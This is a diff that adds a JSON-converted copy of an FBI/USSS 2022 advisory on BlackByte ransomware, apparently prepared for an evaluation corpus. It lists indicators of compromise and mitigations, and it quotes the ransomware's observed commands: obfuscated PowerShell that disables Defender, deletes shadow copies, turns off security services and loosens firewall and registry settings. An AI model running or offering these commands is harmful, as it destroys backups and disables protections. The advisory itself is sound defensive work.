@@ -1,0 +1,98 @@
+[
+ {
+  "id": "p1",
+  "text": "# Indicators of Compromise Associated with BlackByte Ransomware"
+ },
+ {
+  "id": "p2",
+  "text": "> - Publisher: FBI Internet Crime Complaint Center (IC3), CSA listing\n> - Date: 2022-02-11\n> - URL: https://www.ic3.gov/CSA/2022/220211.pdf\n> - PDF SHA-256: 6d8ca888be31022fc754d93cba629e0d83aa9301aaec1d6a07341f76a5cdc6a9 (`source.pdf`, 6 pages)\n> - License: U.S. Government work (public domain)\n> - Text: `pdftotext -layout` output; only page furniture removed by `reports/eval/build_corpus.py` (12 lines). No other edits."
+ },
+ {
+  "id": "p3",
+  "text": "Co-Authored by:                                                                           TLP:WHITE          Product ID: CU-000163-MW\n                                                                                                                    February 11, 2022"
+ },
+ {
+  "id": "p4",
+  "text": "Indicators of Compromise Associated with\n        BlackByte Ransomware\n        SUMMARY\n        This joint Cybersecurity Advisory was developed by the Federal Bureau of Investigation (FBI)\n        and the U.S. Secret Service (USSS) to provide information on BlackByte ransomware. As of\n        November 2021, BlackByte ransomware had compromised multiple US and foreign\n        businesses, including entities in at least three US critical infrastructure sectors (government\n        facilities, financial, and food & agriculture). BlackByte is a Ransomware as a Service (RaaS)\n        group that encrypts files on compromised Windows host systems, including physical and\n        virtual servers."
+ },
+ {
+  "id": "p5",
+  "text": "TECHNICAL DETAILS\n        The BlackByte executable leaves a ransom note in all directories where encryption occurs.\n        The ransom note includes the .onion site that contains instructions for paying the ransom and\n        receiving a decryption key. Some victims reported the actors used a known Microsoft\n        Exchange Server vulnerability as a means of gaining access to their networks. Once in,\n        actors deploy tools to move laterally across the network and escalate privileges before\n        exfiltrating and encrypting files. In some instances, BlackByte ransomware actors have only\n        partially encrypted files. In cases where decryption is not possible, some data recovery can\n        occur. Previous versions of BlackByte ransomware downloaded a .png file from IP addresses\n        185.93.6.31 and 45.9.148.114 prior to encryption. A newer version encrypts without\n        communicating with any external IP addresses. BlackByte ransomware runs executables\n        from c:\\windows\\system32\\ and C:\\Windows\\. Process injection has been observed on\n        processes it creates."
+ },
+ {
+  "id": "p6",
+  "text": "To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact\n        your local FBI field office at www.fbi.gov/contact-us/field-offices or U.S. Secret Service Field Office at\n        www.secretservice.gov/contact/field-offices/. When available, please include the following information regarding\n        the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment\n        used for the activity; the name of the submitting company or organization; and a designated point of contact. To\n        request incident response resources or technical assistance related to these threats, contact CISA at\n        CISAServiceDesk@cisa.dhs.gov.\n        This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information\n        carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public\n        release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction.\n        For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/."
+ },
+ {
+  "id": "p7",
+  "text": "TLP:WHITE                                                                                     FBI | USSS"
+ },
+ {
+  "id": "p8",
+  "text": "Indicators of Compromise\n       The following indicators of compromise (IOCs) are assessed to be associated with BlackByte\n       activity:\n        Suspicious files discovered in the following locations:\n        Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET\n        Files\\root\\e22c2559\\92c7e946\n        inetpub\\wwwroot\\aspnet_client\n        Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\n        Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\n        Program Files\\Microsoft\\Exchange\n        Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\n        Program Files\\Microsoft\\Exchange\n        Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\n        Program Files\\Microsoft\\Exchange\n        Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\premium"
+ },
+ {
+  "id": "p9",
+  "text": "The filenames for suspicious ASPX files appeared to have the following naming conventions:\n              <5 random alphabetical characters>.aspx\n              error<2 capital letters>.aspx\n              iismeta<4 random numbers>.aspx"
+ },
+ {
+  "id": "p10",
+  "text": "Suspicious files were also discovered at:\n        %AppData%\\BB.ico\n        This file is the icon given to files with a .blackbyte file extension.\n        %AppData%\\BlackByteRestore.txt\n        This file is the ransom note that is left in every folder where files are encrypted.\n        %AppData%\\dummy\n        This file is a text file containing a list of machine names that can be reached on the\n        network.\n        %HOMEPATH%\\complex.exe\n        This file is the ransomware executable.\n        Users\\tree.dll\n        This file contains the message \"Your HACKED by BlackByte team. Connect us to restore\n        your system.\" (SIC)"
+ },
+ {
+  "id": "p11",
+  "text": "TLP:WHITE                                                                                        FBI | USSS"
+ },
+ {
+  "id": "p12",
+  "text": "Scheduled tasks may be created and artifacts have been observed at\n       Windows\\System32\\Tasks:\n        C:\\Users\\<username>\\complex.exe -single <SHA256>.\n        This command appears to launch the ransomware.\n        C:\\Windows\\System32\\cmd.exe /c for /l %x in (1,1,75) do start\n        wordpad.exe /p C:\\Users\\tree.dll.\n        This command attempts to open tree.dll in wordpad 75 times and then prints the contents."
+ },
+ {
+  "id": "p13",
+  "text": "IIS logs contain GET and POST requests to various malicious ASPX files that follow a\n       pattern of \"<FILE_PATH>/<SUSPICIOUS_FILENAME>.aspxexec_code=Response.Write\""
+ },
+ {
+  "id": "p14",
+  "text": "Below is a list of hashes of suspicious files that have been observed on systems affected by\n       BlackByte ransomware:\n        MD5 Hashes:\n        4d2da36174633565f3dd5ed6dc5033c4             959a7df5c465fcd963a641d87c18a565\n        cd7034692d8f29f9146deb3641de7986             5f40e1859053b70df9c0753d327f2cee\n        d63a7756bfdcd2be6c755bf288a92c8b             df7befc8cdc3c5434ef27cc669fb1e4b\n        eed7357ab8d2fe31ea3dbcf3f9b7ec74             51f2cf541f004d3c1fa8b0f94c89914a\n        695e343b81a7b0208cbae33e11f7044c             d9e94f076d175ace80f211ea298fa46e\n        296c51eb03e70808304b5f0e050f4f94             8320d9ec2eab7f5ff49186b2e630a15f\n        0c7b8da133799dd72d0dbe3ea012031e             cea6be26d81a8ff3db0d9da666cd0f8f\n        a77899602387665cddb6a0f021184a2b             31f818372fa07d1fd158c91510b6a077\n        1473c91e9c0588f92928bed0ebf5e0f4             d9e94f076d175ace80f211ea298fa46e\n        28b791746c97c0c04dcbfe0954e7173b             a9cf6dce244ad9afd8ca92820b9c11b9\n        52b8ae74406e2f52fd81c8458647acd8             7139415fecd716bec6d38d2004176f5d\n        1785f4058c78ae3dd030808212ae3b04             c13bf39e2f8bf49c9754de7fb1396a33\n        b8e24e6436f6bed17757d011780e87b9             5c0a549ae45d9abe54ab662e53c484e2\n        8dfa48e56fc3a6a2272771e708cdb4d2             ad29212716d0b074d976ad7e33b8f35f\n        4ce0bdd2d4303bf77611b8b34c7d2883             d4aa276a7fbe8dcd858174eeacbb26ce\n        c010d1326689b95a3d8106f75003427c             9344afc63753cd5e2ee0ff9aed43dc56\n        ae6fbc60ba9c0f3a0fef72aeffcd3dc7             e2eb5b57a8765856be897b4f6dadca18\n        405cb8b1e55bb2a50f2ef3e7c2b28496             58e8043876f2f302fbc98d00c270778b\n        11e35160fc4efabd0a3bd7a7c6afc91b             d2a15e76a4bfa7eb007a07fc8738edfb\n        659b77f88288b4874b5abe41ed36380d             e46bfbdf1031ea5a383040d0aa598d45\n        151c6f04aeff0e00c54929f25328f6f7"
+ },
+ {
+  "id": "p15",
+  "text": "TLP:WHITE                                                                                 FBI | USSS"
+ },
+ {
+  "id": "p16",
+  "text": "Below is a list of observed commands that were executed by complex.exe:\n        Observed Commands:\n        cmd.exe /c powershell -command \"$x =\n        [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'\n        +'G4ARAB'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType\n        Disabled $x\"\n        schtasks.exe /DELETE /TN \"\\\"Raccine Rules Updater\\\"\" /F\n        cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\n        cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\n        cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\n        cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\n        cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\n        cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\n        cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\n        cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\n        cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\n        cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\n        cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\n        cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\n        powershell.exe $x =\n        [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA\n        HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb\n        wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A\n        CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x\n        sc.exe config SQLTELEMETRY start= disabled\n        sc.exe config SQLTELEMETRY$ECWDB2 start= disabled\n        sc.exe config SQLWriter start= disabled\n        sc.exe config SstpSvc start= disabled\n        powershell.exe Set-MpPreference -EnableControlledFolderAccess Disabled\n        sc.exe config MBAMService start= disabled\n        sc.exe config wuauserv start= disabled\n        sc.exe config Dnscache start= auto\n        sc.exe config fdPHost start= auto\n        sc.exe config FDResPub start= auto\n        sc.exe config SSDPSRV start= auto\n        sc.exe config upnphost start= auto\n        sc.exe config RemoteRegistry start= auto"
+ },
+ {
+  "id": "p17",
+  "text": "TLP:WHITE                                                                                        FBI | USSS"
+ },
+ {
+  "id": "p18",
+  "text": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new\n        enable=Yes\n        cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\"\" new\n        enable=Yes\n        cmd.exe /c reg add\n        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v\n        LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n        cmd.exe /c reg add\n        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v\n        EnableLinkedConnections /t REG_DWORD /d 1 /f\n        cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v\n        LongPathsEnabled /t REG_DWORD /d 1 /f\n        mountvol.exe A: \\\\?\\Volume{d7e47829-0000-0000-0000-100000000000}\\\n        mountvol.exe B: \\\\?\\Volume{d7e47829-0000-0000-0000-b0e213000000}\\\n        mountvol.exe E: \\\\?\\Volume{fce79ce0-b01f-11e6-b968-806e6f6e6963}\\\n        powershell.exe Install-WindowsFeature -Name \\\"RSAT-AD-PowerShell\\\" –\n        IncludeAllSubFeature\n        net.exe view\n        arp.exe -a\n        powershell.exe Import-Module ActiveDirectory;Get-ADComputer -Filter * -Properties * | FT\n        Name\n        notepad.exe %appdata%\\RestoreMyFiles_BlackByte.txt\n        cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del C:\\Users\\REM\\Desktop\\hybrid-9-8\\complex.exe"
+ },
+ {
+  "id": "p19",
+  "text": "The base64 encoded string in the following command:\n        powershell.exe $x =\n        [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA\n        HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb\n        wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A\n        CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x"
+ },
+ {
+  "id": "p20",
+  "text": "Decodes to:\n        Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"
+ },
+ {
+  "id": "p21",
+  "text": "The base64 encoded string in the following command:\n        cmd.exe /c powershell -command \"$x =\n        [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA\n        B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\""
+ },
+ {
+  "id": "p22",
+  "text": "TLP:WHITE                                                                                          FBI | USSS"
+ },
+ {
+  "id": "p23",
+  "text": "MITIGATIONS\n              Implement regular backups of all data to be stored as air gapped, password protected\n               copies offline. Ensure these copies are not accessible for modification or deletion from\n               any system where the original data resides.\n           •   Implement network segmentation, such that all machines on your network are not\n               accessible from every other machine.\n           •   Install and regularly update antivirus software on all hosts, and enable real time\n               detection.\n           •   Install updates/patch operating systems, software, and firmware as soon as\n               updates/patches are released.\n           •   Review domain controllers, servers, workstations, and active directories for new or\n               unrecognized user accounts.\n           •   Audit user accounts with administrative privileges and configure access controls with\n               least privilege in mind. Do not give all users administrative privileges.\n           •   Disable unused remote access/Remote Desktop Protocol (RDP) ports and monitor\n               remote access/RDP logs for any unusual activity.\n           •   Consider adding an email banner to emails received from outside your organization.\n           •   Disable hyperlinks in received emails.\n           •   Use double authentication when logging into accounts or services.\n           •   Ensure routine auditing is conducted for all accounts.\n           •   Ensure all the identified IOCs are input into the network SIEM for continuous\n               monitoring and alerts."
+ },
+ {
+  "id": "p24",
+  "text": "RESOURCES\n              For additional resources related to the prevention and mitigation of ransomware, go to\n               https://www.stopransomware.gov as well as the CISA-Multi-State Information Sharing\n               and Analysis Center (MS-ISAC) Joint Ransomware Guide. Stopransomware.gov is the\n               Government’s official one-stop location for resources to tackle ransomware more\n               effectively.\n              CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment\n               based on a tiered set of practices to help organizations better assess how well they\n               are equipped to defend and recover from a ransomware incident.\n              CISA offers a range of no-cost cyber hygiene services to help critical infrastructure\n               organizations assess, identify, and reduce their exposure to threats, including\n               ransomware. By requesting these services, organizations of any size could find ways\n               to reduce their risk and mitigate attack vectors."
+ }
+]
